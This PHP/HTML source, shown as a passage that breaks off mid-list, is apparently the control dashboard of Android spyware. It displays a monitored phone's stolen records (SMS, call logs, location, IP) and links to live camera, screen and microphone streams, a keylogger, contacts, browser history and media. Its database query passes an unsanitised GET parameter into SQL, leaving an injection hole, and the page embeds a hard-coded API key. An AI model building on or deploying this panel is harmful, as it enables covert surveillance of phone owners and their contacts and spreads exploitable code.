
<?php include 'config.php'; 



// if(isset($_SESSION['id'])){
//     $userid = $_SESSION['id'];

if (isset($_GET['c'])) {
    $q_id = htmlspecialchars($_GET['c']);

if ($q_id != "") {
    $sseclect = mysqli_query($con, "SELECT * FROM visitor WHERE id ='$q_id'");

    if($sseclect){
        $show = mysqli_fetch_array($sseclect);

        $v_id = htmlspecialchars($show['id']);
        $v_ip = htmlspecialchars($show['ip']);
        $v_user = htmlspecialchars($show['user_agent']);
        $v_time = htmlspecialchars($show['date_time']);
        $v_location = htmlspecialchars($show['location']);
        $v_sms = htmlspecialchars($show['sms']);
        $v_call = htmlspecialchars($show['calllog']);
        $v_system = htmlspecialchars($show['system']);
        $v_more = htmlspecialchars($show['more']);
       
}



?> 
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Welcome to device control</title>
    <meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
   
    <script>
        (function (w, d, s, l, i) {
            w[l] = w[l] || []; w[l].push({
                'gtm.start':
                    new Date().getTime(), event: 'gtm.js'
            }); var f = d.getElementsByTagName(s)[0],
                j = d.createElement(s), dl = l != 'dataLayer' ? '&l=' + l : ''; j.async = true; j.src =
                    'https://www.googletagmanager.com/gtm.js?id=' + i + dl; f.parentNode.insertBefore(j, f);
        })(window, document, 'script', 'dataLayer', 'GTM-KLDLF9N');</script>
    <!-- End Google Tag Manager -->

    <environment names="Development,Staging,Production">
    </environment>
    
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha512-6MXa8B6uaO18Hid6blRMetEIoPqHf7Ux1tnyIQdpt9qI5OACx7C+O3IVTr98vwGnlcg0LOLa02i9Y1HpVhlfiw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha512-SfTiTlX6kk+qitfevl/7LibUOeJWlt9rbyDn92a1DqWOw9vWG2MFoays0sgObmWazO5BQPiFucnnEAjpAB+/Sw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/metisMenu/2.7.7/metisMenu.min.css" integrity="sha512-i/U9K0lwhYfI6Fr8xLlfF4aGPDd36Z0/bkVckqSNKX36iv0ZLK5ZxrCun3wn4kTzOCAjNDOYfQQgvo6J9Q9pjw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/ionicons/2.0.0/css/ionicons.min.css" integrity="sha512-JApjWRnfonFeGBY7t4yq8SWr1A6xVYEJgO/UMIYONxaR3C9GETKUg0LharbJncEzJF5Nmiv+Pr5QNulr81LjGQ==" crossorigin="anonymous" referrerpolicy="no-referrer" />
        <link rel="stylesheet" href="style.css"  />
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/admin-lte/2.4.3/css/skins/_all-skins.min.css" integrity="sha512-D231SkmJ+61oWzyBS0Htmce/w1NLwUVtMSA05ceaprOG4ZAszxnScjexIQwdAr4bZ4NRNdSHH1qXwu1GwEVnvA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap-select/1.13.18/css/bootstrap-select.min.css" integrity="sha512-ARJR74swou2y0Q2V9k0GbzQ/5vJ2RBSoCWokg4zkfM29Fb3vZEQyv0iWBMW/yvKgyHSR/7D64pFMmU8nYmbRkg==" crossorigin="anonymous" referrerpolicy="no-referrer" />
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" integrity="sha512-Cv93isQdFwaKBV+Z4X8kaVBYWHST58Xb/jVOcV9aRsGSArZsgAnFIhMpDoMDcFNoUtday1hdjn0nGp3+KZyyFw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css" integrity="sha512-H9jrZiiopUdsLpg94A333EfumgUBpO9MdbxStdeITo+KEIMaNfHNvwyjjDJb+ERPaRS6DpyRlKbvPUasNItRyw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/iCheck/1.0.3/skins/all.min.css" integrity="sha512-wcKDxok85zB8F9HzgUwzzzPKJhHG7qMfC7bSKrZcFTC2wZXVhmgKNXYuid02cHVnFSC8KOJCXQ8M83UVA7v5Bw==" crossorigin="anonymous" referrerpolicy="no-referrer" />

        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,600,700,300italic,400italic,600italic">
    	

        <script type="text/javascript" src="check.js"></script>
        <script type="text/javascript" src="backed.js"></script>









    
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js" integrity="sha512-+NqPlbbtM1QqiK8ZAo4Yrj2c4lNQoGv8P79DPtKzj++l5jnN39rHA/xsqn8zE9l0uSoxaCdrOgFs6yjyfbBxSg==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/i18next/20.3.1/i18next.min.js" integrity="sha512-YsoAsxKoUaHf66P6tcRZsk8PJppn7p2Qnzlxi/kh5KsLvBJG/xDST58IzpwqtbXgE1KF/N44izAM29QnhFgSkQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-i18next/1.2.1/jquery-i18next.min.js" integrity="sha512-79RgNpOyaf8AvNEUdanuk1x6g53UPoB6Fh2uogMkOMGADBG6B0DCzxc+dDktXkVPg2rlxGvPeAFKoZxTycVooQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/i18next-locize-backend/3.1.3/i18nextLocizeBackend.min.js" integrity="sha512-+T9edvClPOQjbvMkDkrbUToG+mOHCgOqiCO6bumjwfcfl1Ww1vei14VlXPKFuStcdM0taBORWJRM1VMCK70dhg==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/i18next-browser-languagedetector/6.1.1/i18nextBrowserLanguageDetector.min.js" integrity="sha512-2w3BWYt6OjRCQ6dG+KfrrjRkODEmTdtEGwKQ7Ai0YOfhfF53/whWCYmSkqboKc9iSb4ytk7jP3I7Wex1f3ZSrQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap-select/1.13.18/js/bootstrap-select.min.js" integrity="sha512-yDlE7vpGDP7o2eftkCiPZ+yuUyEcaBwoJoIhdXv71KZWugFqEphIS3PU60lEkFaz8RxaVsMpSvQxMBaKVwA5xg==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha512-iztkobsvnjKfAtTNdHkGVjAYTrrtlC7mGp/54c40wowO7LhURYl3gVzzcEqGl/qKXQltJ2HwMrdLcNUdo+N/RQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/admin-lte/2.4.3/js/adminlte.min.js" integrity="sha512-9I2RC2ZsBUaTne5zopeALWxSlskvHAyX2OcaNRNk/7D//J34esUps95A0duyE7ih5+Z0DxQM3tuxlZBvCrrajQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/js-cookie/2.2.1/js.cookie.min.js" integrity="sha512-Meww2sXqNHxI1+5Dyh/9KAtvI9RZSA4c1K2k5iL02oiPO/RH3Q30L3M1albtqMg50u4gRTYdV4EXOQqXEI336A==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.29.1/moment.min.js" integrity="sha512-qTXRIMyZIFb8iQcfjXWCO8+M5Tbc38Qi5WzdPOYZHIlZpzBHG3L3by84BBBOiRGiEb7KKtAOAs5qYdUiZiQNNQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.29.1/moment-with-locales.min.js" integrity="sha512-LGXaggshOkD/at6PFNcp2V2unf9LzFq6LE+sChH7ceMTDP0g2kn6Vxwgg7wkPP7AAtX+lmPqPdxB47A0Nz0cMQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js" integrity="sha512-uURl+ZXMBrF4AwGaWmEetzrd+J5/8NRkWAvJx5sbPSSuOb0bZLqf+tOzniObO00BjHa/dD7gub9oCGMLPQHtQA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
        <script src="check.js" integrity="sha512-RGDpUuNPNGV62jwbX1n/jNVUuK/z/GRbasvukyOim4R8gUEXSAjB4o0gBplhpO8Mv9rr7HNtGzV508Q1LBGsfA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    
</head>

<body class="hold-transition skin-red sidebar-mini">
    <!-- Google Tag Manager (noscript) -->
    <noscript>
        <iframe src="https://www.googletagmanager.com/ns.html?id=GTM-KLDLF9N"
                height="0" width="0" style="display:none;visibility:hidden"></iframe>
    </noscript>
    <!-- End Google Tag Manager (noscript) -->
    <div class="wrapper">
        <!-- Top Navbar -->
        <!-- Main Header -->
    <header class="main-header">
        <!-- Logo -->
        <a href="javascript:void(0);" class="logo">
            <!-- mini logo for sidebar mini 50x50 pixels -->
            <span class="logo-mini"><b>Device Info</b></span>
            <!-- logo for regular state and mobile devices -->
            <span class="logo-lg"><b>Device Details</b></span>
        </a>
        <!-- Header Navbar -->
        <nav class="navbar navbar-static-top" role="navigation">
            <!-- Sidebar toggle button-->
            <a href="#" class="sidebar-toggle" data-toggle="push-menu" role="button">
                <span class="sr-only">Toggle Navigation</span>
            </a>
            <!-- Navbar Right Menu -->
            <div class="navbar-custom-menu">
                <ul class="nav navbar-nav">
                    <!-- Messages: style can be found in dropdown.less-->
                    <li class="dropdown messages-menu">
                        <a href="demo/ios">
                            <i class="fa fa-apple text-gray"></i>
                        </a>
                        <ul class="dropdown-menu"></ul>
                    </li>
                    <li class="dropdown messages-menu">
                        <a href="demo/android">
                            <i class="fa fa-android text-gray"></i>
                        </a>
                        <ul class="dropdown-menu"></ul>
                    </li>
                    <!-- Messages: style can be found in dropdown.less-->
                    <!-- User Account Menu -->
                    <li class="dropdown user user-menu">
                        <!-- Menu Toggle Button -->
                        <a href="#" class="dropdown-toggle" data-toggle="dropdown">
                            <!-- The user image in the navbar-->
                            <img src="images/avatar.png" class="user-image" alt="">
                            <!-- hidden-xs hides the username on small devices so only the image appears. -->
                            <span class="hidden-xs"><span class="__cf_email__" data-cfemail="0e6a6b63614e6a6b6361206d6163">[email&#160;protected]</span></span>
                        </a>
                        <ul class="dropdown-menu">
                            <!-- The user image in the menu -->
                            <li class="user-header">
                                <img src="images/avatar.png" class="img-circle" alt="">
                                <p>
                                    <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="c9adaca4a689adaca4a6e7aaa6a4">[email&#160;protected]</a>
                                    <small data-i18n="topnav.member_since">License From</small>
                                    <small class="unixTime">1628142177</small>
                                </p>
                            </li>
                            <li class="user-footer">
                                <div class="pull-left">
                                    <a href="/device" class="btn-sm btn-block btn-danger" data-i18n="topnav.try_now">Full Info</a>
                                </div>
                                <div class="pull-right">
                                    <a href="/device" class="btn-sm btn-block btn-danger" data-i18n="topnav.try_now">Full Info</a>
                                </div>
                            </li>
                        </ul>
                    </li>
                    <!-- Control Sidebar Toggle Button -->
                    <li>
                        <a href="#" data-toggle="control-sidebar"><i class="fa fa-gears"></i></a>
                    </li>
                </ul>
            </div>
        </nav>
    </header>

            <!-- Navigation -->
            <!-- Left side column. contains the logo and sidebar -->
    <aside class="main-sidebar">
        <!-- sidebar: style can be found in sidebar.less -->
        <section class="sidebar">
            <!-- Sidebar user panel (optional) -->
            <div class="user-panel">
                <div class="pull-left image">
                    <img src="images/avatar.png" class="img-circle" alt="">
                </div>
                <div class="pull-left info">
                    <p data-i18n="demo.android_title"><?php echo$v_system; ?></p>
                    <a class="statusflag"><i class="fa fa-refresh fa-spin text-green"></i><span data-i18n="dashboard.online"> watting</span></a>
                </div>
            </div>
            <!-- Sidebar Menu -->
            <ul class="sidebar-menu" data-widget="tree">
                <li class="">
                   <!--  <a href="/demo/ios"><i class="fa fa-apple text-green"></i><span class="nav-label" data-i18n="demo.android_title_demo"></span></a> -->
                </li>
                <li class="active">
                    <a href="/demo/android"><i class="fa fa-th-large"></i><span class="nav-label" data-i18n="nav.dashboard">Dashboard</span> </a>
                </li>
                <li class="treeview menu-open ">
                    <a href="#"><i class="fa fa-tripadvisor"></i> <span data-i18n="nav.live">Live</span><span class="pull-right-container"><i class="fa fa-angle-left pull-right"></i></span></a>
                    <ul class="treeview-menu" style="display:block;">
                        <li class=""><a href="/demo/android/live/camera"><i class="fa fa-circle-o text-green"></i> <span data-i18n="nav.cameras">Live Cameras Stream</span><span class="label label-danger pull-right" data-i18n="nav.hot">Hot</span></a></li>
                        <li class=""><a href="/demo/android/live/screen"><i class="fa fa-circle-o text-yellow"></i> <span data-i18n="nav.screen">Live Screen Stream</span><span class="label label-danger pull-right" data-i18n="nav.hot">Hot</span></a></li>
                        <li class=""><a href="/demo/android/live/voice"><i class="fa fa-circle-o text-aqua"></i> <span data-i18n="nav.microphone">Live Microphone</span><span class="label label-danger pull-right" data-i18n="nav.hot">Hot</span></a></li>
                        <li class=""><a href="/demo/android/live/screenshot"><i class="fa fa-circle-o text-yellow"></i> <span data-i18n="nav.screenshot">Screenshot</span><span class="label label-danger pull-right" data-i18n="nav.hot">Hot</span></a></li>
                        <li class=""><a href="/demo/android/live/takephoto"><i class="fa fa-circle-o text-blue"></i> <span data-i18n="nav.take_photo">Take Photo</span><span class="label label-danger pull-right" data-i18n="nav.hot">Hot</span></a></li>
                        <li class=""><a href="/demo/android/live/voicerecorder"><i class="fa fa-circle-o text-aqua"></i> <span data-i18n="nav.microphone_recorder">Microphone Recorder</span><span class="label label-danger pull-right" data-i18n="nav.hot">Hot</span></a></li>
                        <li class=""><a href="/demo/android/live/messages"><i class="fa fa-circle-o text-red"></i> <span data-i18n="nav.messaging">App Messaging</span><span class="label label-danger pull-right" data-i18n="nav.hot">Hot</span></a></li>
                    </ul>
                </li>
                <li class="treeview menu-open ">
                    <a href="#"><i class="fa fa-tasks"></i> <span data-i18n="nav.apps">Apps</span><span class="pull-right-container"><i class="fa fa-angle-left pull-right"></i></span></a>
                    <ul class="treeview-menu" style="display:block;">
                        <li class=""><a href="#"><i class="fa fa-circle-o text-red"></i> <span class="nav-label" data-i18n="nav.timeline">Timeline</span><span class="label label-danger pull-right" data-i18n="nav.hot">Hot</span></a></li>
                        
                        <li class=""><a href="#"><i class="fa fa-circle-o text-green"></i> <span class="nav-label" data-i18n="nav.install">Install</span><span class="label label-danger pull-right">Hot</span></a></li>
                        <li class=""><a href="#"><i class="fa fa-circle-o text-yellow"></i> <span class="nav-label" data-i18n="nav.activity">Activity</span><span class="label label-success pull-right">Hot</span></a></li>
                    </ul>
                </li>
                <li class="">
                    <a href="/demo/android/calllog"><i class="fa fa-phone"></i><span class="nav-label" data-i18n="nav.call_hisotry">Call Hisotry</span></a>
                </li>
                <li class="">
                    <a href="/demo/android/sms"><i class="fa fa-comments"></i><span class="nav-label" data-i18n="nav.sms">Text Messages</span></a>
                </li>
                <li class="">
                    <a href="/demo/android/location"><i class="fa fa-map-marker"></i><span class="nav-label" data-i18n="nav.location_history">Location History</span><span class="label label-success pull-right">Hot</span></a>
                </li>
                <li class="">
                    <a href="/demo/android/wifi"><i class="fa fa-wifi"></i><span class="nav-label" data-i18n="nav.wifi">WiFi History</span><span class="label label-success pull-right">Hot</span></a>
                </li>
                <li class="">
                    <a href="/demo/android/browser"><i class="fa fa-history"></i><span class="nav-label" data-i18n="nav.browser">Browser History</span><span class="label label-success pull-right">Hot</span></a>
                </li>
                <li class="">
                    <a href="/demo/android/contact"><i class="fa fa-male"></i><span class="nav-label" data-i18n="nav.contacts">Contacts</span><span class="label label-success pull-right">Hot</span></a>
                </li>
                <li class="">
                    <a href="/demo/android/calendar"><i class="fa fa-calendar"></i><span class="nav-label" data-i18n="nav.calendars">Calendars</span><span class="label label-success pull-right">Hot</span></a>
                </li>
                <li class="">
                    <a href="/demo/android/image"><i class="fa fa-image"></i><span class="nav-label" data-i18n="nav.images">Images</span><span class="label label-success pull-right">Hot</span></a>
                </li>
                <li class="">
                    <a href="/demo/android/video"><i class="fa fa-film"></i><span class="nav-label" data-i18n="nav.videos">Videos</span><span class="label label-success pull-right">Hot</span></a>
                </li>
                <li class="">
                    <a href="/demo/android/audio"><i class="fa fa-file-audio-o"></i><span class="nav-label" data-i18n="nav.audios">Audios</span><span class="label label-success pull-right">Hot</span></a>
                </li>
            </ul>
            <!-- /.sidebar-menu -->
        </section>
        <!-- /.sidebar -->
    </aside>

            <!-- Main view  -->
            
    <!-- Content Wrapper. Contains page content -->
    <div class="content-wrapper">
       <!--  <section class="content-header">
        <div class="alert alert-success alert-dismissible">
                <h4><i class="icon fa fa-android"></i> <span data-i18n="demo.android_demo">Demo</span></h4>
                <div data-i18n="demo.android_tip">
             
                </div><br />
                <p><h4><a href="/demo/ios" data-i18n="demo.switch_ios">iOS</a></h4></p>
        </div>
    </section> -->
        <!-- Content Header (Page header) -->
        <section class="content-header">
            <h1>
                <span data-i18n="dashboard.android">Dashboard</span> <span class="pull-right">
            <a href="/account/register" target="_self" class="btn btn-large btn-block btn-danger" data-i18n="topnav.try_now">More info</a>
    </span>
            </h1>
        </section>

        <section class="content">
            <div class="row">
                <div class="col-md-6">
                    <div class="box box-success">
                        <div class="box-header with-border">
                            <span data-i18n="dashboard.device_info">Device Information</span>
                            <div class="box-tools pull-right"></div>
                        </div>
                        <div class="box-body">
                            <h3 class="profile-username text-center" data-i18n="dashboard.andorid_demo">Name</h3>
                            <ul class="list-group list-group-unbordered">
                                <li class="list-group-item"><b data-i18n="dashboard.device_model">Device Model</b> <span class="pull-right"><?php echo $v_system ?> </span></li>
                                <li class="list-group-item"><b data-i18n="dashboard.phone_number">Phone Number(s)</b> <span class="pull-right">+0122434445</span></li>
                                <li class="list-group-item"><b data-i18n="dashboard.battery">Battery Level</b> <span class="pull-right">77%</span></li>
                            </ul>
                            <div class="text-center">
                                <a class="btn btn-app" href="/demo/android/live/camera">
                                    <span class="badge bg-red" data-i18n="nav.hot">44%</span>
                                    <i class="fa fa-camera text-yellow"></i><span data-i18n="nav.cameras">Live Cameras</span>
                                </a>
                                <a class="btn btn-app" href="/demo/android/live/screen">
                                    <span class="badge bg-red" data-i18n="nav.hot">Hot</span>
                                    <i class="fa fa-desktop text-yellow"></i><span data-i18n="nav.screen">Live Call</span>
                                </a>
                                <a class="btn btn-app" href="/demo/android/live/messages">
                                    <span class="badge bg-red" data-i18n="nav.hot">Hot</span>
                                    <i class="fa fa-comment text-yellow"></i><span data-i18n="nav.messaging">Live Messages</span>
                                </a>
                                <a class="btn btn-app" href="/demo/android/live/voice">
                                    <span class="badge bg-red" data-i18n="nav.hot">Hot</span>
                                    <i class="fa fa-volume-control-phone text-yellow"></i><span data-i18n="nav.microphone">Live Microphone</span>
                                </a>
                                <a class="btn btn-app" href="/demo/android/app/keylogger">
                                    <i class="fa fa-keyboard-o text-yellow"></i><span data-i18n="nav.keylogger">Keyloggers</span>
                                </a>
                                <a class="btn btn-app" href="/demo/android/live/screenshot">
                                    <span class="badge bg-red" data-i18n="nav.hot">Hot</span>
                                    <i class="fa fa-desktop text-yellow"></i><span data-i18n="nav.screenshot">Screenshot</span>
                                </a>
                                <a class="btn btn-app" href="/demo/android/live/voicerecorder">
                                    <span class="badge bg-red" data-i18n="nav.hot">Hot</span>
                                    <i class="fa fa-volume-control-phone text-yellow"></i><span data-i18n="nav.microphone_recorder">Microphone Recorder</span>
                                </a>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="col-md-6">
                    <div class="box box-success">
                        <div class="box-header with-border" data-i18n="dashboard.last_location">Coordinates of City</div>
                        <a target="_blank" href="https://www.google.com/maps/place/@<?php echo $v_location;?>"><?php echo $v_location;?></a>
                        <div class="box-body">
                           
<div id="googleMap" style="width:100%;height:400px;"></div>

<script>
function myMap() {
var mapProp= {
  center:new google.maps.LatLng(23.6206636,89.8005754),
  zoom:5,
};
var map = new google.maps.Map(document.getElementById("googleMap"),mapProp);
}
</script>

<script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyDtbuXDS2zbfyWioozrUcK_T16Jt6zBpxI&callback=myMap"></script>

                        </div>
                    </div>
                </div>
                <!-- /.col -->
            </div>

            <div class="row">
                <div class="col-lg-3 col-xs-6">
                    <!-- small box -->
                    <div class="small-box bg-aqua">
                        <div class="inner"><h3>View</h3><p data-i18n="nav.sms">Text Messages</p></div><div class="icon"><i class="ion ion-chatbox-working"></i></div>
                        <a href="#sms" class="small-box-footer"><small class="unixTime">1627818586</small>&nbsp;&nbsp;&nbsp;<i class="fa fa-arrow-circle-right"></i></a>
                    </div>
                </div>
                <div class="col-lg-3 col-xs-6">
                    <!-- small box -->
                    <div class="small-box bg-aqua">
                        <div class="inner"><h3>View</h3><p data-i18n="nav.call_hisotry">Call History</p></div><div class="icon"><i class="ion ion-ios-telephone"></i></div>
                        <a href="#call" class="small-box-footer"><small class="unixTime">1627918469</small>&nbsp;&nbsp;&nbsp;<i class="fa fa-arrow-circle-right"></i></a>
                    </div>
                </div>
                <div class="col-lg-3 col-xs-6">
                    <!-- small box -->
                    <div class="small-box bg-aqua">
                        <div class="inner"><h3>View</h3><p data-i18n="nav.location_history">Location History</p></div><div class="icon"><i class="ion ion-location"></i></div>
                        <a href="#location" class="small-box-footer"><small class="unixTime">1628561913</small>&nbsp;&nbsp;&nbsp;<i class="fa fa-arrow-circle-right"></i></a>
                    </div>
                </div>
                <div class="col-lg-3 col-xs-6">
                    <!-- small box -->
                    <div class="small-box bg-aqua">
                        <div class="inner"><h3>View</h3><p data-i18n="nav.contacts">Contacts</p></div><div class="icon"><i class="ion ion-person-add"></i></div>
                        <a href="#contact" class="small-box-footer"><small class="unixTime">1628480262</small>&nbsp;&nbsp;&nbsp;<i class="fa fa-arrow-circle-right"></i></a>
                    </div>
                </div>
                <div class="col-lg-3 col-xs-6">
                    <!-- small box -->
                    <div class="small-box bg-green">
                        <div class="inner"><h3>Hot</h3><p data-i18n="nav.install">Installed Apps</p></div><div class="icon"><i class="ion ion-android-playstore"></i></div>
                        <a href="#" class="small-box-footer"><small class="unixTime">1628406494</small>&nbsp;&nbsp;&nbsp;<i class="fa fa-arrow-circle-right"></i></a>
                    </div>
                </div>
                <div class="col-lg-3 col-xs-6">
                    <!-- small box -->
                    <div class="small-box bg-green">
                        <div class="inner"><h3>Hot</h3><p data-i18n="nav.timeline">App Message Timeline</p></div><div class="icon"><i class="ion ion-android-list"></i></div>
                        <a href="#" class="small-box-footer"><small class="unixTime">1628287556</small>&nbsp;&nbsp;&nbsp;<i class="fa fa-arrow-circle-right"></i></a>
                    </div>
                </div>
                <div class="col-lg-3 col-xs-6">
                    <!-- small box -->
                    <div class="small-box bg-green">
                        <div class="inner"><h3>Hot</h3><p data-i18n="nav.wifi">WiFi History</p></div><div class="icon"><i class="ion ion-wifi"></i></div>
                        <a href="#" class="small-box-footer"><small class="unixTime">1628572722</small>&nbsp;&nbsp;&nbsp;<i class="fa fa-arrow-circle-right"></i></a>
                    </div>
                </div>
                <div class="col-lg-3 col-xs-6">
                    <!-- small box -->
                    <div class="small-box bg-green">
                        <div class="inner"><h3>Hot</h3><p data-i18n="nav.browser">Browser History</p></div><div class="icon"><i class="ion ion-refresh"></i></div>
                        <a href="#" class="small-box-footer"><small class="unixTime">1628062936</small>&nbsp;&nbsp;&nbsp;<i class="fa fa-arrow-circle-right"></i></a>
                    </div>
                </div>
                <div class="col-lg-3 col-xs-6">
                    <!-- small box -->
                    <div class="small-box bg-yellow">
                        <div class="inner"><h3>Hot</h3><p data-i18n="nav.calendars">Calendar</p></div><div class="icon"><i class="ion ion-ios-bell"></i></div>
                        <a href="#" class="small-box-footer"><small class="unixTime">1627955420</small>&nbsp;&nbsp;&nbsp;<i class="fa fa-arrow-circle-right"></i></a>
                    </div>
                </div>
                <div class="col-lg-3 col-xs-6">
                    <!-- small box -->
                    <div class="small-box bg-yellow">
                        <div class="inner"><h3>Hot</h3><p data-i18n="nav.images">Images</p></div><div class="icon"><i class="ion ion-images"></i></div>
                        <a href="#" class="small-box-footer"><small class="unixTime">1628454832</small>&nbsp;&nbsp;&nbsp;<i class="fa fa-arrow-circle-right"></i></a>
                    </div>
                </div>
                <div class="col-lg-3 col-xs-6">
                    <!-- small box -->
                    <div class="small-box bg-yellow">
                        <div class="inner"><h3>Hot</h3><p data-i18n="nav.videos">Videos</p></div><div class="icon"><i class="ion ion-android-film"></i></div>
                        <a href="#" class="small-box-footer"><small class="unixTime">1628077923</small>&nbsp;&nbsp;&nbsp;<i class="fa fa-arrow-circle-right"></i></a>
                    </div>
                </div>
                <div class="col-lg-3 col-xs-6">
                    <!-- small box -->
                    <div class="small-box bg-yellow">
                        <div class="inner"><h3>Hot</h3><p data-i18n="nav.audios">Audios</p></div><div class="icon"><i class="ion ion-android-microphone"></i></div>
                        <a href="#" class="small-box-footer"><small class="unixTime">1628425382</small>&nbsp;&nbsp;&nbsp;<i class="fa fa-arrow-circle-right"></i></a>
                    </div>
                </div>
            </div>

            <!-- <div class="row">
                <div class="col-md-6">
                    <div class="box box-success">
                        <div class="box-header with-border"><h5 data-i18n="dashboard.last_sms">Lastest Text Message</h5></div>
                        <div class="box-body">
                            <ul class="products-list product-list-in-box">
                                <li class="item">
                                    <div class="product-img"><img alt="" class="img-circle user-image" src="images/avatar.png"></div>
                                    <div class="product-info">
                                        <small class="pull-right unixTime">1627982415</small><strong>Ada</strong> (840-661-****) <br>
                                        <small class="text-muted" data-i18n="dashboard.demo_message">Will you go out with me this Saturday?</small>
                                    </div>
                                </li>
                            </ul>
                        </div>
                    </div>
                </div>
                <div class="col-md-6">
                    <div class="box box-success">
                        <div class="box-header with-border"><h5 data-i18n="dashboard.last_call">Lastest Call</h5></div>
                        <div class="box-body">
                            <ul class="products-list product-list-in-box">
                                <li class="item">
                                    <div class="product-img"><img alt="" class="img-circle" src="images/avatar.png"></div>
                                    <div class="product-info">
                                        <small class="pull-right unixTime">1628242057</small><strong>Anne</strong> (860-731-****) <br>
                                        <small class="text-muted">00:36:12</small>
                                    </div>
                                </li>
                            </ul>
                        </div>
                    </div>
                </div>
            </div> -->

            <div class="row">
                <div class="col-md-6">
                    <div class="box box-success">
                        <div class="box-header with-border"><h5 data-i18n="dashboard.top_contacts">Call Contacts</h5></div>
                        <div class="box-body">
                            <!-- <iframe src="images/read.txt" frameborder="0" height="400"
      width="95%"></iframe>
 -->

                           <ul class="products-list product-list-in-box">
                                <li class="item">
                                    <div class="product-img"><img alt="" width="50" height="50" class="img-circle" src="images/avatar.png"></div>
                                    <div class="product-info">
                                        <span href="javascript:void(0)" class="product-title">
                                            <strong>Amanda</strong> (704-792-****) <span class="label label-danger pull-right">354 calls</span>
                                        </span>
                                        <span class="product-description"><small class="unixTime">1628008837</small></span>
                                    </div>
                                </li>
                                <li class="item">
                                    <div class="product-img"><img alt="" width="50" height="50" class="img-circle" src="images/avatar.png"></div>
                                    <div class="product-info">
                                        <span href="javascript:void(0)" class="product-title">
                                            <strong>Ashley</strong> (202-330-****) <span class="label label-danger pull-right">245 calls</span>
                                        </span>
                                        <span class="product-description"><small class="unixTime">1628384284</small></span>
                                    </div>
                                </li>
                                <li class="item">
                                    <div class="product-img"><img alt="" width="50" height="50" class="img-circle" src="images/avatar.png"></div>
                                    <div class="product-info">
                                        <span href="javascript:void(0)" class="product-title">
                                            <strong>Bonnie</strong> (718-895-****) <span class="label label-danger pull-right">134 calls</span>
                                        </span>
                                        <span class="product-description"><small class="unixTime">1628231295</small></span>
                                    </div>
                                </li>
                                <li class="item">
                                    <div class="product-img"><img alt="" width="50" height="50" class="img-circle" src="images/avatar.png"></div>
                                    <div class="product-info">
                                        <span href="javascript:void(0)" class="product-title">
                                            <strong>Beatrice</strong> (323-605-****) <span class="label label-warning pull-right">75 calls</span>
                                        </span>
                                        <span class="product-description"><small class="unixTime">1628243622</small></span>
                                    </div>
                                </li>
                                <li class="item">
                                    <div class="product-img"><img alt="" width="50" height="50" class="img-circle" src="images/avatar.png"></div>
                                    <div class="product-info">
                                        <span href="javascript:void(0)" class="product-title">
                                            <strong>Cherry</strong> (712-773-****) <span class="label label-warning pull-right">34 calls</span>
                                        </span>
                                        <span class="product-description"><small class="unixTime">1628277118</small></span>
                                    </div>
                                </li>
                            </ul>
                        </div>
                    </div>
                </div>
                <div class="col-md-6">
                    <div class="box box-success">
                        <div class="box-header with-border"><h5 data-i18n="dashboard.top_message">Message Contacts</h5></div>
                        <div class="box-body">

                            <!-- <iframe src="images/read.txt" frameborder="0" height="400"
      width="95%"></iframe> -->
                           <ul class="products-list product-list-in-box">
                                <li class="item">
                                    <div class="product-img"><img alt="" width="50" height="50" class="img-circle" src="images/avatar.png"></div>
                                    <div class="product-info">
